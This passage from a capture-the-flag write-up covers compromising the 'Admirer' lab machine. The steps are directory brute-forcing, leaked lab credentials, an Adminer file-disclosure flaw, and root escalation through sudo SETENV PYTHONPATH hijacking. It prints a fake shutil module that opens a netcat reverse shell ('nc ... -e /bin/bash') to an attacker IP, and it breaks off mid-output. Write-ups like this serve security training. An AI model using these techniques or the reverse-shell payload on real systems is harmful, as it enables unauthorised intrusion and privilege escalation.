highlighter-rouge">http://admirer.htb/admin-dir/</code> led to a <code class="language-plaintext highlighter-rouge">403</code>, so I think its time to bust out the directory brute-forcer.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://admirer.htb/admin-dir <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-t</span> 12 <span class="nt">-k</span> <span class="nt">-x</span> .php,.txt
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://admirer.htb/admin-dir
+<span class="o">[</span>+] Threads:        12
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     php,txt
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/05/28 08:31:50 Starting gobuster
+<span class="o">===============================================================</span>
+/contacts.txt <span class="o">(</span>Status: 200<span class="o">)</span>
+/credentials.txt <span class="o">(</span>Status: 200<span class="o">)</span>
+</pre></table></code></div></div><p>Lets visit them.</p><p><code class="language-plaintext highlighter-rouge">http://admirer.htb/admin-dir/contacts.txt</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre>##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">http://admirer.htb/admin-dir/credentials.txt</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+</pre></table></code></div></div><p>Using the <code class="language-plaintext highlighter-rouge">ftp</code> credentials we found, we can go back to the <code class="language-plaintext highlighter-rouge">ftp</code> service.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>ftp admirer.htb
+Connected to admirer.htb.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>admirer.htb:root<span class="o">)</span>: ftpuser
+331 Please specify the password.
+Password: %n?4Wz<span class="o">}</span>R<span class="nv">$tTF7</span>
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">dir
+</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span>    1 0        0            3405 Dec 02  2019 dump.sql
+<span class="nt">-rw-r--r--</span>    1 0        0         5270987 Dec 03  2019 html.tar.gz
+226 Directory send OK.
+</pre></table></code></div></div><p>We see 2 files so lets download them and analyse them. The <code class="language-plaintext highlighter-rouge">dump.sql</code> contained nothing useful so lets see what’s inside of <code class="language-plaintext highlighter-rouge">html.tar.gz</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xvf</span> html.tar.gz
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
+total 5188
+drwxr-xr-x  6 root root        4096 May 28 08:43 <span class="nb">.</span>
+drwxr-xr-x 27 root root        4096 Aug 22 05:34 ..
+drwxr-x---  6 root www-data    4096 Jun  6  2019 assets
+<span class="nt">-rw-r--r--</span>  1 root root     5270987 May 28 08:42 html.tar.gz
+drwxr-x---  4 root www-data    4096 Dec  2  2019 images
+<span class="nt">-rw-r-----</span>  1 root www-data    4613 Dec  3  2019 index.php
+<span class="nt">-rw-r-----</span>  1 root www-data     134 Dec  1  2019 robots.txt
+drwxr-x---  2 root www-data    4096 May 28 09:38 utility-scripts
+drwxr-x---  2 root www-data    4096 Dec  2  2019 w4ld0s_s3cr3t_d1r
+</pre></table></code></div></div><p>In this folder were 3 interesting files.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>index.php
+...
+                                         &lt;?php
+                        <span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+                        <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"waldo"</span><span class="p">;</span>
+                        <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"]F7jLHw:*G&gt;UPrTo}~A"</span>d6b<span class="s2">";
+                        </span><span class="nv">$dbname</span><span class="s2"> = "</span>admirerdb<span class="s2">";
+...
+</span></pre></table></code></div></div><p>Alright, we got one set of credentials. In <code class="language-plaintext highlighter-rouge">utility-scripts</code>, there was a <code class="language-plaintext highlighter-rouge">admin_tasks.php</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+</pre><td class="rouge-code"><pre>&lt;html&gt;
+&lt;<span class="nb">head</span><span class="o">&gt;</span>
+  &lt;title&gt;Administrative Tasks&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h3&gt;Admin Tasks Web Interface <span class="o">(</span>v0.01 beta<span class="o">)</span>&lt;/h3&gt;
+  &lt;?php
+  // Web Interface to the admin_tasks script
+  // 
+  <span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'task'</span><span class="o">]))</span>
+  <span class="o">{</span>
+    <span class="nv">$task</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'task'</span><span class="o">]</span><span class="p">;</span>
+    <span class="k">if</span><span class="o">(</span><span class="nv">$task</span> <span class="o">==</span> <span class="s1">'1'</span> <span class="o">||</span> <span class="nv">$task</span> <span class="o">==</span> <span class="s1">'2'</span> <span class="o">||</span> <span class="nv">$task</span> <span class="o">==</span> <span class="s1">'3'</span> <span class="o">||</span> <span class="nv">$task</span> <span class="o">==</span> <span class="s1">'4'</span> <span class="o">||</span>
+       <span class="nv">$task</span> <span class="o">==</span> <span class="s1">'5'</span> <span class="o">||</span> <span class="nv">$task</span> <span class="o">==</span> <span class="s1">'6'</span> <span class="o">||</span> <span class="nv">$task</span> <span class="o">==</span> <span class="s1">'7'</span><span class="o">)</span>
+    <span class="o">{</span>
+      /<span class="k">***********************************************************************************</span> 
+         Available options:
+           1<span class="o">)</span> View system <span class="nb">uptime
+           </span>2<span class="o">)</span> View logged <span class="k">in </span><span class="nb">users
+           </span>3<span class="o">)</span> View crontab <span class="o">(</span>current user only<span class="o">)</span>
+           4<span class="o">)</span> Backup passwd file <span class="o">(</span>not working<span class="o">)</span>
+           5<span class="o">)</span> Backup shadow file <span class="o">(</span>not working<span class="o">)</span>
+           6<span class="o">)</span> Backup web data <span class="o">(</span>not working<span class="o">)</span>
+           7<span class="o">)</span> Backup database <span class="o">(</span>not working<span class="o">)</span>
+
+           NOTE: Options 4-7 are currently NOT working because they need root privileges.
+                 I<span class="s1">'m leaving them in the valid tasks in case I figure out a way
+                 to securely run code as root from a PHP page.
+      ************************************************************************************/
+      echo str_replace("\n", "&lt;br /&gt;", shell_exec("/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1"));
+    }
+    else
+    {
+      echo("Invalid task.");
+    }
+  } 
+  ?&gt;
+
+  &lt;p&gt;
+  &lt;h4&gt;Select task:&lt;/p&gt;
+  &lt;form method="POST"&gt;
+    &lt;select name="task"&gt;
+      &lt;option value=1&gt;View system uptime&lt;/option&gt;
+      &lt;option value=2&gt;View logged in users&lt;/option&gt;
+      &lt;option value=3&gt;View crontab&lt;/option&gt;
+      &lt;option value=4 disabled&gt;Backup passwd file&lt;/option&gt;
+      &lt;option value=5 disabled&gt;Backup shadow file&lt;/option&gt;
+      &lt;option value=6 disabled&gt;Backup web data&lt;/option&gt;
+      &lt;option value=7 disabled&gt;Backup database&lt;/option&gt;
+    &lt;/select&gt;
+    &lt;input type="submit"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</span></pre></table></code></div></div><p>If we visit it, this is how it looks:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/admirer3.png" alt="" /></p><p>We can’t inject any arbitrary commands into the <code class="language-plaintext highlighter-rouge">shell_exec</code> since the <code class="language-plaintext highlighter-rouge">if</code> check is pretty tight. Moving on, there was another file called <code class="language-plaintext highlighter-rouge">db_admin.php</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>utility-scripts/db_admin.php
+...
+  <span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+  <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"waldo"</span><span class="p">;</span>
+  <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"Wh3r3_1s_w4ld0?"</span><span class="p">;</span>
+
+  // Create connection
+  <span class="nv">$conn</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="nv">$servername</span>, <span class="nv">$username</span>, <span class="nv">$password</span><span class="o">)</span><span class="p">;</span>
+...
+// TODO: Finish implementing this or find a better open <span class="nb">source </span>alternative
+</pre></table></code></div></div><p>Cool we found some database credentials but we can’t use them yet. However this page doesn’t exist anymore. Could it have to do with the comment in <code class="language-plaintext highlighter-rouge">db_admin.php</code>?</p><p>I consulted the forums and people were saying that the name of this box was a hint. I went to google “<code class="language-plaintext highlighter-rouge">open source admirer</code>” and I found what they were talking about.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/admirer4.png" alt="" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB.
+...
+Usage: Just put the file adminer.css alongside adminer.php.
+</pre></table></code></div></div><p>The usage tells us that there is a <code class="language-plaintext highlighter-rouge">adminer.php</code>, so lets see if it’s there.</p><p><code class="language-plaintext highlighter-rouge">http://admirer.htb/utility-scripts/adminer.php</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/admirer5.png" alt="" /></p><h1 id="exploitation-1">Exploitation (1)</h1><p>We found our next lead! I tested out the credentials we found but they were incorrect :( Maybe the files we found were outdated? Searching online, this version of <code class="language-plaintext highlighter-rouge">Adminer</code> (<code class="language-plaintext highlighter-rouge">4.6.2</code>) has a <a href="https://www.acunetix.com/vulnerabilities/web/adminer-4-6-2-file-disclosure-vulnerability/">vulnerability</a> which allows us to read files on the web server. I followed this <a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">guide</a> which allowed to me read <code class="language-plaintext highlighter-rouge">index.php</code> on the web server.</p><p>First, we will need a <code class="language-plaintext highlighter-rouge">SQL</code> server. Fortunately, Kali Linux already comes with <code class="language-plaintext highlighter-rouge">MariaDB</code> installed so all we have to do is start it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>systemctl start mysql
+</pre></table></code></div></div><p>Next, we will need to create a new account and assign privileges to it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>mysql
+Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MariaDB connection <span class="nb">id </span>is 39
+Server version: 10.3.20-MariaDB-1 Debian buildd-unstable
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
+
+MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> use mysql<span class="p">;</span>
+Reading table information <span class="k">for </span>completion of table and column names
+You can turn off this feature to get a quicker startup with <span class="nt">-A</span>
+
+Database changed
+MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> CREATE USER <span class="s1">'root'</span>@<span class="s1">'admirer.htb'</span> IDENTIFIED BY <span class="s1">'toor'</span><span class="p">;</span>
+Query OK, 0 rows affected <span class="o">(</span>0.000 sec<span class="o">)</span>
+MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> GRANT ALL PRIVILEGES ON <span class="k">*</span> <span class="nb">.</span> <span class="k">*</span> TO <span class="s1">'root'</span>@<span class="s1">'admirer.htb'</span><span class="p">;</span>
+Query OK, 0 rows affected <span class="o">(</span>0.000 sec<span class="o">)</span>
+</pre></table></code></div></div><p>Now we can use <code class="language-plaintext highlighter-rouge">adminer.php</code> to access our <code class="language-plaintext highlighter-rouge">MariaDB</code> server by entering our attacker’s machine IP Address as the Server, <code class="language-plaintext highlighter-rouge">root</code> as the username and <code class="language-plaintext highlighter-rouge">toor</code> as the password. The database field can be left blank.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/admirer7.png" alt="" /></p><p>We then need to create a new database and new table inside it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/admirer8.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/admirer9.png" alt="" /></p><p>Now, we can proceed to load the contents of <code class="language-plaintext highlighter-rouge">index.php</code> into the table we made.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/admirer10.png" alt="" /></p><p>And finally, we can view the contents of <code class="language-plaintext highlighter-rouge">index.php</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/admirer11.png" alt="" /></p><p>We can use these new credentials to login to the database on the box but there was only one table which contained nothing useful.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/admirer12.png" alt="" /></p><h1 id="usertxt">user.txt</h1><p>Thinking back, there was a <code class="language-plaintext highlighter-rouge">ssh</code> service running port <code class="language-plaintext highlighter-rouge">22</code>. Perhaps we can <code class="language-plaintext highlighter-rouge">ssh</code> with the credentials?</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh waldo@admirer.htb
+waldo@admirer.htb<span class="s1">'s password: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;
+waldo@admirer:~$ cat user.txt
+a9f7XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</span></pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>As <code class="language-plaintext highlighter-rouge">waldo</code>, we got <code class="language-plaintext highlighter-rouge">sudo</code> rights to run <code class="language-plaintext highlighter-rouge">/opt/scripts/admin_tasks.sh</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>waldo@admirer:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span> 
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>waldo: &amp;&lt;h5b~yK3F#<span class="o">{</span>PaPB&amp;dA<span class="o">}{</span>H&gt;
+Matching Defaults entries <span class="k">for </span>waldo on admirer:
+    env_reset, <span class="nv">env_file</span><span class="o">=</span>/etc/sudoenv, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, <span class="nv">listpw</span><span class="o">=</span>always
+
+User waldo may run the following commands on admirer:
+    <span class="o">(</span>ALL<span class="o">)</span> SETENV: /opt/scripts/admin_tasks.sh
+</pre></table></code></div></div><p>Lets see what’s inside.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+</pre><td class="rouge-code"><pre>waldo@admirer:~<span class="nv">$ </span><span class="nb">cat</span> /opt/scripts/admin_tasks.sh
+<span class="c">#!/bin/bash</span>
+
+view_uptime<span class="o">()</span>
+<span class="o">{</span>
+    /usr/bin/uptime <span class="nt">-p</span>
+<span class="o">}</span>
+
+view_users<span class="o">()</span>
+<span class="o">{</span>
+    /usr/bin/w
+<span class="o">}</span>
+
+view_crontab<span class="o">()</span>
+<span class="o">{</span>
+    /usr/bin/crontab <span class="nt">-l</span>
+<span class="o">}</span>
+
+backup_passwd<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/passwd to /var/backups/passwd.bak..."</span>
+        /bin/cp /etc/passwd /var/backups/passwd.bak
+        /bin/chown root:root /var/backups/passwd.bak
+        /bin/chmod 600 /var/backups/passwd.bak
+        <span class="nb">echo</span> <span class="s2">"Done."</span>
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+
+backup_shadow<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/shadow to /var/backups/shadow.bak..."</span>
+        /bin/cp /etc/shadow /var/backups/shadow.bak
+        /bin/chown root:shadow /var/backups/shadow.bak
+        /bin/chmod 600 /var/backups/shadow.bak
+        <span class="nb">echo</span> <span class="s2">"Done."</span>
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+
+backup_web<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Running backup script in the background, it might take a while..."</span>
+        /opt/scripts/backup.py &amp;
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+
+backup_db<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Running mysqldump in the background, it may take a while..."</span>
+        <span class="c">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span>
+        /usr/bin/mysqldump <span class="nt">-u</span> root admirerdb <span class="o">&gt;</span> /var/backups/dump.sql &amp;
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+
+
+
+<span class="c"># Non-interactive way, to be used by the web interface</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-eq</span> 1 <span class="o">]</span>
+<span class="k">then
+    </span><span class="nv">option</span><span class="o">=</span><span class="nv">$1</span>
+    <span class="k">case</span> <span class="nv">$option</span> <span class="k">in
+        </span>1<span class="p">)</span> view_uptime <span class="p">;;</span>
+        2<span class="p">)</span> view_users <span class="p">;;</span>
+        3<span class="p">)</span> view_crontab <span class="p">;;</span>
+        4<span class="p">)</span> backup_passwd <span class="p">;;</span>
+        5<span class="p">)</span> backup_shadow <span class="p">;;</span>
+        6<span class="p">)</span> backup_web <span class="p">;;</span>
+        7<span class="p">)</span> backup_db <span class="p">;;</span>
+
+        <span class="k">*</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Unknown option."</span> <span class="o">&gt;</span>&amp;2
+    <span class="k">esac
+
+    </span><span class="nb">exit </span>0
+<span class="k">fi</span>
+
+
+<span class="c"># Interactive way, to be called from the command line</span>
+<span class="nv">options</span><span class="o">=(</span><span class="s2">"View system uptime"</span>
+         <span class="s2">"View logged in users"</span>
+         <span class="s2">"View crontab"</span>
+         <span class="s2">"Backup passwd file"</span>
+         <span class="s2">"Backup shadow file"</span>
+         <span class="s2">"Backup web data"</span>
+         <span class="s2">"Backup DB"</span>
+         <span class="s2">"Quit"</span><span class="o">)</span>
+
+<span class="nb">echo
+echo</span> <span class="s2">"[[[ System Administration Menu ]]]"</span>
+<span class="nv">PS3</span><span class="o">=</span><span class="s2">"Choose an option: "</span>
+<span class="nv">COLUMNS</span><span class="o">=</span>11
+<span class="k">select </span>opt <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">options</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
+    case</span> <span class="nv">$REPLY</span> <span class="k">in
+        </span>1<span class="p">)</span> view_uptime <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        2<span class="p">)</span> view_users <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        3<span class="p">)</span> view_crontab <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        4<span class="p">)</span> backup_passwd <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        5<span class="p">)</span> backup_shadow <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        6<span class="p">)</span> backup_web <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        7<span class="p">)</span> backup_db <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+        8<span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Bye!"</span> <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
+
+        <span class="k">*</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Unknown option."</span> <span class="o">&gt;</span>&amp;2
+    <span class="k">esac
+done
+
+</span><span class="nb">exit </span>0
+</pre></table></code></div></div><p>It’s quite long but if we zoom in to the <code class="language-plaintext highlighter-rouge">backup_web</code> function, we see that it is running a <code class="language-plaintext highlighter-rouge">python</code> script <code class="language-plaintext highlighter-rouge">/opt/scripts/backup.py</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>waldo@admirer:~<span class="nv">$ </span><span class="nb">cat</span> /opt/scripts/backup.py
+<span class="c">#!/usr/bin/python3</span>
+
+from shutil import make_archive
+
+src <span class="o">=</span> <span class="s1">'/var/www/html/'</span>
+
+<span class="c"># old ftp directory, not used anymore</span>
+<span class="c">#dst = '/srv/ftp/html'</span>
+
+dst <span class="o">=</span> <span class="s1">'/var/backups/html'</span>
+
+make_archive<span class="o">(</span>dst, <span class="s1">'gztar'</span>, src<span class="o">)</span>
+</pre></table></code></div></div><p>This script simply creates a <code class="language-plaintext highlighter-rouge">.tar.gz</code> file from the contents of <code class="language-plaintext highlighter-rouge">/var/backups/html</code>.</p><h1 id="exploitation-2">Exploitation (2)</h1><p>Hmm… How does the <code class="language-plaintext highlighter-rouge">SETENV</code> in the <code class="language-plaintext highlighter-rouge">sudo</code> rights come into place? With <code class="language-plaintext highlighter-rouge">SETENV</code>, we are able to set/modify environment variables when running the script with <code class="language-plaintext highlighter-rouge">sudo</code>. For example, I can do this: <code class="language-plaintext highlighter-rouge">sudo x=something /opt/scripts/admin_tasks.sh</code> and the script will run with the environment variable <code class="language-plaintext highlighter-rouge">x</code> set to <code class="language-plaintext highlighter-rouge">something</code>.</p><p>Since we know that the script executes <code class="language-plaintext highlighter-rouge">make_archive</code> from the <code class="language-plaintext highlighter-rouge">shutil</code> module, what we can do is create a fake <code class="language-plaintext highlighter-rouge">shutil</code> module with a fake <code class="language-plaintext highlighter-rouge">make_archive</code> function and modify the <code class="language-plaintext highlighter-rouge">$PYTHONPATH</code> variable to point to the location of our fake module and run the script! The <code class="language-plaintext highlighter-rouge">$PYTHONPATH</code> contains a list of additional directories where <code class="language-plaintext highlighter-rouge">Python</code> looks for modules for importing.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>waldo@admirer:~<span class="nv">$ </span><span class="nb">cat </span>shutil.py
+import os
+
+def make_archive<span class="o">(</span>a,b,c<span class="o">)</span>:
+    os.system<span class="o">(</span><span class="s2">"nc 10.10.XX.XX 1337 -e /bin/bash"</span><span class="o">)</span>
+
+</pre></table></code></div></div><p>Now, all we have to do is run <code class="language-plaintext highlighter-rouge">admin_task.sh</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>waldo@admirer:/tmp<span class="nv">$ </span><span class="nb">sudo </span><span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp /opt/scripts/admin_tasks.sh
+
+<span class="o">[[[</span> System Administration Menu <span class="o">]]]</span>
